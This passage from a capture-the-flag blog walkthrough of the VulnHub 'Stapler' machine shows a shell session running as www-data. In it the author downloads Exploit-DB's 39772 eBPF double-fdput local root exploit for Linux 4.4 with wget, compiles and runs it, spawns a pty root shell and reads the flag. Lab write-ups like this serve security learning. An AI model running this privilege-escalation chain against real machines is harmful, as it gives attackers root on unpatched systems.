</span><span class='line'>Linux red.initech 4.4.0-21-generic <span class="c">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span>
</span><span class='line'> 16:08:13 up <span class="m">1</span> day,  1:59,  <span class="m">0</span> users,  load average: 0.00, 0.01, 0.05
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'>/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
</span><span class='line'><span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/
</span><span class='line'><span class="nv">$ </span>uname -a
</span><span class='line'>Linux red.initech 4.4.0-21-generic <span class="c">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span>
</span><span class='line'><span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>After enumeration, I know the target machine is running Linux Kernel 4.4.0, so by using <code>searchsploit</code> to search any existed vulnerability to against the target machine, and lucky I found one Local Root Exploit which is <a href="https://www.exploit-db.com/exploits/39772/" title="Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' in bpf(BPF_PROG_LOAD) Local Root Exploit"><code>Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' in bpf(BPF_PROG_LOAD) Local Root Exploit</code></a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
</span><span class='line'>--2016-08-13 20:17:02--  https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
</span><span class='line'>Resolving github.com <span class="o">(</span>github.com<span class="o">)</span>... 192.30.253.113
</span><span class='line'>Connecting to github.com <span class="o">(</span>github.com<span class="o">)</span><span class="p">|</span>192.30.253.113<span class="p">|</span>:443... connected.
</span><span class='line'>HTTP request sent, awaiting response... <span class="m">302</span> Found
</span><span class='line'>Location: https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/39772.zip <span class="o">[</span>following<span class="o">]</span>
</span><span class='line'>--2016-08-13 20:17:03--  https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/39772.zip
</span><span class='line'>Resolving raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>... 151.101.100.133
</span><span class='line'>Connecting to raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span><span class="p">|</span>151.101.100.133<span class="p">|</span>:443... connected.
</span><span class='line'>HTTP request sent, awaiting response... <span class="m">200</span> OK
</span><span class='line'>Length: <span class="m">7115</span> <span class="o">(</span>6.9K<span class="o">)</span> <span class="o">[</span>application/zip<span class="o">]</span>
</span><span class='line'>Saving to: <span class="s1">&#39;39772.zip&#39;</span>
</span><span class='line'>
</span><span class='line'>     0K ......                                                100% 14.5M<span class="o">=</span>0s
</span><span class='line'>
</span><span class='line'>2016-08-13 20:17:03 <span class="o">(</span>14.5 MB/s<span class="o">)</span> - <span class="s1">&#39;39772.zip&#39;</span> saved <span class="o">[</span>7115/7115<span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$ </span>unzip 39772.zip
</span><span class='line'>Archive:  39772.zip
</span><span class='line'>   creating: 39772/
</span><span class='line'>  inflating: 39772/.DS_Store
</span><span class='line'>   creating: __MACOSX/
</span><span class='line'>   creating: __MACOSX/39772/
</span><span class='line'>  inflating: __MACOSX/39772/._.DS_Store
</span><span class='line'>  inflating: 39772/crasher.tar
</span><span class='line'>  inflating: __MACOSX/39772/._crasher.tar
</span><span class='line'>  inflating: 39772/exploit.tar
</span><span class='line'>  inflating: __MACOSX/39772/._exploit.tar
</span><span class='line'><span class="err">$</span>
</span><span class='line'><span class="nv">$ </span><span class="nb">cd </span>39772
</span><span class='line'><span class="nv">$ </span>ls
</span><span class='line'>crasher.tar
</span><span class='line'>exploit.tar
</span><span class='line'><span class="nv">$ </span>tar vxf exploit.tar
</span><span class='line'>ebpf_mapfd_doubleput_exploit/
</span><span class='line'>ebpf_mapfd_doubleput_exploit/hello.c
</span><span class='line'>ebpf_mapfd_doubleput_exploit/suidhelper.c
</span><span class='line'>ebpf_mapfd_doubleput_exploit/compile.sh
</span><span class='line'>ebpf_mapfd_doubleput_exploit/doubleput.c
</span><span class='line'><span class="err">$</span>
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span><span class="nb">cd </span>ebpf_mapfd_doubleput_exploit
</span><span class='line'><span class="nv">$ </span>ls
</span><span class='line'>compile.sh
</span><span class='line'>doubleput.c
</span><span class='line'>hello.c
</span><span class='line'>suidhelper.c
</span><span class='line'><span class="nv">$ </span>./compile.sh
</span><span class='line'>doubleput.c: In <span class="k">function</span> <span class="s1">&#39;make_setuid&#39;</span>:
</span><span class='line'>doubleput.c:91:13: warning: cast from pointer to integer of different size <span class="o">[</span>-Wpointer-to-int-cast<span class="o">]</span>
</span><span class='line'>    .insns <span class="o">=</span> <span class="o">(</span>__aligned_u64<span class="o">)</span> insns,
</span><span class='line'>             ^
</span><span class='line'>doubleput.c:92:15: warning: cast from pointer to integer of different size <span class="o">[</span>-Wpointer-to-int-cast<span class="o">]</span>
</span><span class='line'>    .license <span class="o">=</span> <span class="o">(</span>__aligned_u64<span class="o">)</span><span class="s2">&quot;&quot;</span>
</span><span class='line'>               ^
</span><span class='line'><span class="nv">$ </span>ls -la
</span><span class='line'>total 60
</span><span class='line'>drwxr-x--- <span class="m">2</span> www-data www-data  <span class="m">4096</span> Aug <span class="m">13</span> 20:18 .
</span><span class='line'>drwxr-xr-x <span class="m">4</span> www-data www-data  <span class="m">4096</span> Aug <span class="m">13</span> 20:17 ..
</span><span class='line'>-rwxr-x--- <span class="m">1</span> www-data www-data   <span class="m">155</span> Apr <span class="m">25</span> 23:25 compile.sh
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> www-data www-data <span class="m">12332</span> Aug <span class="m">13</span> 20:18 doubleput
</span><span class='line'>-rw-r----- <span class="m">1</span> www-data www-data  <span class="m">4188</span> Apr <span class="m">25</span> 23:25 doubleput.c
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> www-data www-data  <span class="m">8024</span> Aug <span class="m">13</span> 20:18 hello
</span><span class='line'>-rw-r----- <span class="m">1</span> www-data www-data  <span class="m">2186</span> Apr <span class="m">25</span> 23:25 hello.c
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> www-data www-data  <span class="m">7520</span> Aug <span class="m">13</span> 20:18 suidhelper
</span><span class='line'>-rw-r----- <span class="m">1</span> www-data www-data   <span class="m">255</span> Apr <span class="m">25</span> 23:25 suidhelper.c
</span><span class='line'><span class="nv">$ </span>./doubleput
</span><span class='line'>starting writev
</span><span class='line'>woohoo, got pointer reuse
</span><span class='line'>id
</span><span class='line'>writev returned successfully. <span class="k">if</span> this worked, you<span class="s1">&#39;ll have a root shell in &lt;=60 seconds.</span>
</span><span class='line'><span class="s1">suid file detected, launching rootshell...</span>
</span><span class='line'><span class="s1">we have root privs now...</span>
</span><span class='line'><span class="s1">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span>
</span><span class='line'><span class="s1">id</span>
</span><span class='line'><span class="s1">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span>
</span><span class='line'><span class="s1">python -c &quot;import pty; pty.spawn(&#39;</span>/bin/bash<span class="err">&#39;</span><span class="o">)</span><span class="p">;</span><span class="err">&quot;</span>
</span><span class='line'>root@red:/tmp/39772/ebpf_mapfd_doubleput_exploit#
</span></code></pre></td></tr></table></div></figure>


<p>Brilliant! we now got ROOT and caught the flag file under directory <code>/root/</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@red:/root# ls
</span><span class='line'>ls
</span><span class='line'>fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
</span><span class='line'>root@red:/root# cat flag.txt
</span><span class='line'>cat flag.txt
</span><span class='line'>~~~~~~~~~~&lt;<span class="o">(</span>Congratulations<span class="o">)</span>&gt;~~~~~~~~~~
</span><span class='line'>                          .-<span class="s1">&#39;&#39;&#39;&#39;&#39;-.</span>
</span><span class='line'><span class="s1">                          |&#39;</span>-----<span class="s1">&#39;|</span>
</span><span class='line'><span class="s1">                          |-.....-|</span>
</span><span class='line'><span class="s1">                          |       |</span>
</span><span class='line'><span class="s1">                          |       |</span>
</span><span class='line'><span class="s1">         _,._             |       |</span>
</span><span class='line'><span class="s1">    __.o`   o`&quot;-.         |       |</span>
</span><span class='line'><span class="s1"> .-O o `&quot;-.o   O )_,._    |       |</span>
</span><span class='line'><span class="s1">( o   O  o )--.-&quot;`O   o&quot;-.`&#39;</span>-----<span class="s1">&#39;`</span>
</span><span class='line'><span class="s1"> &#39;</span>--------<span class="err">&#39;</span>  <span class="o">(</span>   o  O    o<span class="o">)</span>
</span><span class='line'>              <span class="sb">`</span>----------<span class="sb">`</span>
</span><span class='line'>b6b545dc11b7a270f4bad23432190c75162c4a2b
</span><span class='line'>
</span><span class='line'>root@red:/root#
</span></code></pre></td></tr></table></div></figure>




<!--- Reference -->



</div>


<div class="meta">
	<div class="date">




2016-08-15 21:21:02 +1000</div>
	

<div class="tags">

	<a class='category' href='/blog/categories/stapler/'>stapler</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>

</div>


	
</div></article>

	<div class="share">
	<div class="addthis_toolbox addthis_default_style ">
	
	
	<a class="addthis_button_tweet"></a>
	
	
<!---	<a class="addthis_counter addthis_pill_style"></a> --->
	</div>
  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
</div>


</div>
	<footer id="footer" class="inner">Copyright &copy; 2016

    <font color="green">F4l13n5n0w</font>

<br>
Powered by Octopress.
</footer>
	<script src="/javascripts/slash.js"></script>
<script src="/javascripts/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
	$('.fancybox').fancybox();
})(jQuery);
</script> <!-- Delete or comment this line to disable Fancybox -->






</body>
</html>
